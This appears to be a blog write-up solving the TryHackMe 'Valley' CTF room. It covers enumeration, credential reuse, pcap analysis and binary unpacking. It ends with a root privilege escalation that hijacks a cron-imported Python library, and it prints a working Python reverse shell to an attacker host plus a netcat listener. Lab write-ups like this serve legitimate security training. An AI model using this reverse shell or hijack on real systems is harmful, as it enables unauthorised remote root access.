---
title: "Valley"
date: 2025-02-15
image: /assets/img/tryhackme/Valley/Valley_image.jpg
description: Writeup of the TryHackMe-CTF Valley
categories: [TryHackMe, Easy]
tags: [linux, privesc, rev, web]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Valley</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Can you find your way into the Valley?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/valleype">https://tryhackme.com/room/valleype</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Valley.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.199.91                                                        
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 11:20 EST
  Nmap scan report for 10.10.199.91
  Host is up (0.044s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  37370/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 31.06 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,37370 10.10.199.91
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 11:20 EST
  Nmap scan report for 10.10.199.91
  Host is up (0.040s latency).

  PORT      STATE SERVICE VERSION
  22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
  |   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
  |_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
  80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  37370/tcp open  ftp     vsftpd 3.0.3
  Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

Since I didn't find anything on the website, I continued with a directory enumeration:
```bash
$ gobuster dir --url http://10.10.199.91/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.91/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 301) [Size: 314] [--> http://10.10.199.91/gallery/]
/static               (Status: 301) [Size: 313] [--> http://10.10.199.91/static/]
/pricing              (Status: 301) [Size: 314] [--> http://10.10.199.91/pricing/]
```

I found a file called `note.txt`:
```text
J,
Please stop leaving notes randomly on the website
-RP
```

Because of that, I started several Gobuster scans with the `-x txt` flag. The `/static` directory was particularly intersting:
```bash
$ gobuster dir --url http://10.10.199.91/static --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.91/static
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/11                   (Status: 200) [Size: 627909]
/12                   (Status: 200) [Size: 2203486]
/10                   (Status: 200) [Size: 2275927]
/3                    (Status: 200) [Size: 421858]
/4                    (Status: 200) [Size: 7389635]
/13                   (Status: 200) [Size: 3673497]
/15                   (Status: 200) [Size: 3477315]
/1                    (Status: 200) [Size: 2473315]
/16                   (Status: 200) [Size: 2468462]
/5                    (Status: 200) [Size: 1426557]
/6                    (Status: 200) [Size: 2115495]
/18                   (Status: 200) [Size: 2036137]
/9                    (Status: 200) [Size: 1190575]
/2                    (Status: 200) [Size: 3627113]
/7                    (Status: 200) [Size: 5217844]
/14                   (Status: 200) [Size: 3838999]
/17                   (Status: 200) [Size: 3551807]
/8                    (Status: 200) [Size: 7919631]
/00                   (Status: 200) [Size: 127]
```

They all show pictures and are almost the same size, so `/00` stood out as potentially interesting. 
```text
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

The `/dev1243224123123` directory seemed to be a hidden path, with the following login page:

![dev login](/assets/img/tryhackme/Valley/thm_valley_1.jpg)

I examined the source code and identified the following credentials:
```JavaScript
if (username === "[removed]" && password === "[removed]") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
```

With the login, another note appeared:
```text
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

Because of the hint abput reused credentials, I tried the same credentials for the FTP server:
```bash
$ ftp -P 37370 siemDev@10.10.199.91
  Connected to 10.10.199.91.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> dir
  229 Entering Extended Passive Mode (|||60994|)
  150 Here comes the directory listing.
  -rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
  -rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
  -rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```

I proceeded by analyzing the files one by one. The only intersting one was `siemHTTP2.pcapng`. As the filename suggests, I expected to find HTTP packets. I started by filter for `http` and then searched for `POST` requests. There was only one, but it contained something noteworthy:

![post package](/assets/img/tryhackme/Valley/thm_valley_2.jpg)

I first tried the credentials on `/dev1243224123123`, but they didn't work. Then I tried to them via SSH and was able to retrieve the user flag:
```bash
valleyDev@valley:~$ pwd
	/home/valleyDev
valleyDev@valley:~$ ls
	user.txt
valleyDev@valley:~$ cat user.txt
	THM{[removed]}
```

## Privilege Escalation valleyAdmin

I analyzed the machine further and found an intersting file:
```bash
valleyDev@valley:/home$ ls -al
total 752
drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
```

I downloaded and analyzed the file:
```bash
$ file valleyAuthenticator                    
  valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```

After loading the file in IDA, I noticed it was packed with UPX:

![upx packed](/assets/img/tryhackme/Valley/thm_valley_3.jpg)

After unpacking the binary:
```bash
$ upx -d valleyAuthenticator -o UnpackedValleyAuthenticator
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2290962 <-    749128   32.70%   linux/amd64   UnpackedValleyAuthenticator

Unpacked 1 file.
```

I was finally able to uncover what was hidden using IDA.:

![ida](/assets/img/tryhackme/Valley/thm_valley_4.jpg)

The values appeared to be MD5 hashes, so I pasted them into `crackstation`:

![Crackstation](/assets/img/tryhackme/Valley/thm_valley_5.jpg)

This looked promising, so I switched back to the machine and tried to escalate privileges. First, I checked the `/etc/passwd` file to verify if there was a matching username from the decrypted MD5 hash:
```bash
[...]
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
[...]
```

I found a match so I was able to switch the user:
```bash
valleyDev@valley:/home$ su valley
Password: 
valley@valley:/home$ id
	uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

## Privilege Escalation root

I wasn't able to execute `sudo -l`, so I searched for other escalation paths. The `crontab` had an interesting entry:
```bash
valley@valley:/home$ cat /etc/crontab
[...]
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
[...]
```

As seen in the `id` output we are part of the `valleyAdmin` group, so I checked which files this group could modify:
```bash
valley@valley:/home$ find / -group valleyAdmin -type f 2>/dev/null
	/usr/lib/python3.8/base64.py
```

Interestingly, we can modify the `base64.py`, which is imported by `photosEncrypt.py`, which in turn is executed by root. To escalate privileges, I inserted a Python reverse shell into the `base.py`:
```bash
import socket,subprocess,os, pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("[attackerip]",9005))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("bash")
```

After one minute, my `netcat` listener recieved a connection, and I was able to capture the root flag:
```bash
$ nc -lnvp 9005                      
  listening on [any] 9005 ...
  connect to [attackerip] from (UNKNOWN) [10.10.203.94] 39500
root@valley:~# cd /root
root@valley:~# ls
	root.txt  snap
root@valley:~# cat root.txt
	THM{[removed]}
```

solved! :)
